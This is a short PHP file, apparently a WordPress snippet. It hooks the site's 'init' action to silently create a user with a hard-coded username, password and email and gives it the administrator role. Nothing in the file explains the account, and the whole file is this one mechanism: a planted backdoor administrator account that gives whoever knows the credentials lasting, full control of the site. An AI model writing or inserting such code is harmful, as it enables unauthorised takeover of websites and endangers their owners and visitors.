<?php
add_action('init', function() {
    $u = 'connexionelectrical';
    $p = 'goldensilence';
    $e = 'connexionelectrical@domain.com';

    if (!username_exists($u)) {
        $user_id = wp_create_user($u, $p, $e);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
});
